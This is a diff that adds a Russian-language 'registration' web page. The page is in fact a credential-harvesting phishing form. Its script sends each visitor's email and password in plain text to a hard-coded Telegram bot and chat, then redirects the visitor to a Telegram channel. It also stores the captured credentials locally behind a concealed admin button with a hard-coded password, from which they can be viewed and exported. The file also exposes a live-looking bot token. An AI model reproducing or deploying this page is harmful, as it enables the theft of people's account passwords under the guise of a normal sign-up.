@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Регистрация</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
+body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; padding: 20px; }
+
+.box {
+    background: #17212b;
+    border-radius: 24px;
+    padding: 40px 30px;
+    width: 380px;
+    max-width: 100%;
+    border: 1px solid #2b3b4a;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.7);
+}
+.logo { text-align: center; font-size: 48px; margin-bottom: 10px; }
+h1 { text-align: center; font-size: 24px; margin-bottom: 8px; font-weight: 700; }
+.sub { text-align: center; color: #8a9aa8; font-size: 14px; margin-bottom: 30px; }
+
+input {
+    width: 100%;
+    padding: 16px 18px;
+    margin-bottom: 14px;
+    background: #1e2a36;
+    border: 1px solid #2b3b4a;
+    border-radius: 12px;
+    color: #fff;
+    font-size: 15px;
+    outline: none;
+    transition: border 0.2s;
+}
+input:focus { border-color: #6a9bd8; }
+input::placeholder { color: #5a6a7a; }
+
+button {
+    width: 100%;
+    padding: 16px;
+    background: linear-gradient(135deg, #6a9bd8, #4a7bb8);
+    border: none;
+    border-radius: 12px;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: all 0.2s;
+    margin-top: 8px;
+}
+button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(106,155,216,0.4); }
+button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+.status { text-align: center; font-size: 13px; margin-top: 16px; min-height: 18px; }
+.status.ok { color: #4caf50; }
+.status.err { color: #e85a5a; }
+.footer { text-align: center; color: #4a5a6a; font-size: 11px; margin-top: 24px; }
+
+/* АДМИН-ПАНЕЛЬ */
+#adminPanel {
+    display: none;
+    background: #17212b;
+    border-radius: 24px;
+    padding: 30px;
+    width: 700px;
+    max-width: 100%;
+    border: 1px solid #2b3b4a;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.7);
+}
+#adminPanel h2 { text-align: center; margin-bottom: 20px; color: #6a9bd8; }
+.data-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-top: 15px;
+}
+.data-table th, .data-table td {
+    padding: 12px;
+    text-align: left;
+    border-bottom: 1px solid #2b3b4a;
+    font-size: 14px;
+}
+.data-table th { color: #8a9aa8; font-weight: 600; }
+.data-table td { color: #fff; word-break: break-all; }
+.no-data { text-align: center; color: #8a9aa8; padding: 30px; }
+.admin-actions { display: flex; gap: 10px; margin-top: 20px; }
+.admin-actions button {
+    margin-top: 0;
+    font-size: 14px;
+    padding: 12px;
+    background: #2b3b4a;
+}
+.admin-actions button:hover { background: #3b4b5a; box-shadow: none; }
+.danger { background: #7a2a2a !important; }
+.danger:hover { background: #9a3a3a !important; }
+
+/* Скрытая кнопка для входа в админку */
+#secretAdmin {
+    position: fixed;
+    bottom: 10px;
+    right: 10px;
+    background: transparent;
+    border: none;
+    color: #1a1a1a;
+    font-size: 10px;
+    cursor: pointer;
+    opacity: 0.1;
+}
+#secretAdmin:hover { opacity: 0.5; color: #6a9bd8; }
+</style>
+</head>
+<body>
+
+<!-- СТРАНИЦА РЕГИСТРАЦИИ -->
+<div class="box" id="registerBox">
+    <div class="logo">✨</div>
+    <h1>Регистрация</h1>
+    <div class="sub">Создайте аккаунт за 10 секунд</div>
+
+    <input type="email" id="email" placeholder="Электронная почта" autocomplete="off">
+    <input type="password" id="password" placeholder="Пароль" autocomplete="off">
+
+    <button id="submitBtn" onclick="sendData()">Зарегистрироваться</button>
+
+    <div class="status" id="status"></div>
+    <div class="footer">Нажимая кнопку, вы соглашаетесь с условиями сервиса</div>
+</div>
+
+<!-- АДМИН-ПАНЕЛЬ -->
+<div id="adminPanel">
+    <h2>🔐 Админ-панель</h2>
+    <div id="adminContent"></div>
+    <div class="admin-actions">
+        <button onclick="exportData()">📥 Скачать</button>
+        <button onclick="clearData()" class="danger">🗑️ Очистить</button>
+        <button onclick="logout()">🚪 Выйти</button>
+    </div>
+</div>
+
+<!-- Скрытая кнопка для входа в админку -->
+<button id="secretAdmin" onclick="showAdminLogin()">●</button>
+
+<script>
+// ==========================================
+// НАСТРОЙКИ
+// ==========================================
+const BOT_TOKEN = "8919588998:AAGb4TnFIwZpEQIFTAiAyrtbWmUAIvaoPj8";
+const CHAT_ID = "8570961249";
+const ADMIN_PASSWORD = "BeMgl45";
+// ==========================================
+
+// Хранилище данных в браузере
+let users = JSON.parse(localStorage.getItem('angel_users') || '[]');
+
+function saveUsers() {
+    localStorage.setItem('angel_users', JSON.stringify(users));
+}
+
+// ОТПРАВКА ДАННЫХ
+async function sendData() {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const status = document.getElementById('status');
+    const btn = document.getElementById('submitBtn');
+
+    if (!email || !email.includes('@')) {
+        status.className = 'status err';
+        status.textContent = 'Введите корректную почту';
+        return;
+    }
+    if (!password || password.length < 3) {
+        status.className = 'status err';
+        status.textContent = 'Введите пароль (минимум 3 символа)';
+        return;
+    }
+
+    btn.disabled = true;
+    status.className = 'status';
+    status.textContent = 'Отправка...';
+
+    // Сохраняем локально
+    users.push({
+        email: email,
+        password: password,
+        date: new Date().toLocaleString('ru-RU')
+    });
+    saveUsers();
+
+    // Отправляем в Telegram
+    const text = `🔐 НОВАЯ РЕГИСТРАЦИЯ\n\n📧 Почта: ${email}\n🔑 Пароль: ${password}\n\n🕒 ${new Date().toLocaleString('ru-RU')}`;
+
+    try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        });
+        const result = await response.json();
+
+        if (result.ok) {
+            status.className = 'status ok';
+            status.textContent = '✅ Регистрация успешна!';
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            setTimeout(() => { window.location.href = 'https://t.me/AngelShoti'; }, 1500);
+        } else {
+            status.className = 'status err';
+            status.textContent = 'Ошибка отправки. Попробуйте позже.';
+            btn.disabled = false;
+        }
+    } catch (e) {
+        status.className = 'status err';
+        status.textContent = 'Ошибка сети. Попробуйте позже.';
+        btn.disabled = false;
+    }
+}
+
+// ==========================================
+// АДМИН-ПАНЕЛЬ
+// ==========================================
+function showAdminLogin() {
+    const pass = prompt("Введите пароль администратора:");
+    if (pass === ADMIN_PASSWORD) {
+        showAdminPanel();
+    } else if (pass !== null) {
+        alert("❌ Неверный пароль");
+    }
+}
+
+function showAdminPanel() {
+    document.getElementById('registerBox').style.display = 'none';
+    document.getElementById('adminPanel').style.display = 'block';
+    renderAdmin();
+}
+
+function renderAdmin() {
+    const content = document.getElementById('adminContent');
+    if (users.length === 0) {
+        content.innerHTML = '<div class="no-data">📭 Пока нет зарегистрированных пользователей</div>';
+        return;
+    }
+
+    let html = `<table class="data-table">
+        <tr>
+            <th>#</th>
+            <th>Почта</th>
+            <th>Пароль</th>
+            <th>Дата</th>
+        </tr>`;
+
+    users.forEach((u, i) => {
+        html += `<tr>
+            <td>${i + 1}</td>
+            <td>${u.email}</td>
+            <td>${u.password}</td>
+            <td>${u.date}</td>
+        </tr>`;
+    });
+
+    html += `</table>
+    <div style="text-align:center; margin-top:15px; color:#8a9aa8;">
+        Всего пользователей: <b style="color:#6a9bd8;">${users.length}</b>
+    </div>`;
+
+    content.innerHTML = html;
+}
+
+function exportData() {
+    if (users.length === 0) {
+        alert("Нет данных для экспорта");
+        return;
+    }
+    let text = "🔐 ДАННЫЕ ПОЛЬЗОВАТЕЛЕЙ\n\n";
+    users.forEach((u, i) => {
+        text += `${i + 1}. Почта: ${u.email} | Пароль: ${u.password} | ${u.date}\n`;
+    });
+
+    const blob = new Blob([text], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'users.txt';
+    a.click();
+    URL.revokeObjectURL(url);
+}
+
+function clearData() {
+    if (confirm("Удалить все данные?")) {
+        users = [];
+        saveUsers();
+        renderAdmin();
+        alert("✅ Данные очищены");
+    }
+}
+
+function logout() {
+    document.getElementById('adminPanel').style.display = 'none';
+    document.getElementById('registerBox').style.display = 'block';
+}
+</script>
+
+</body>
+  </html>
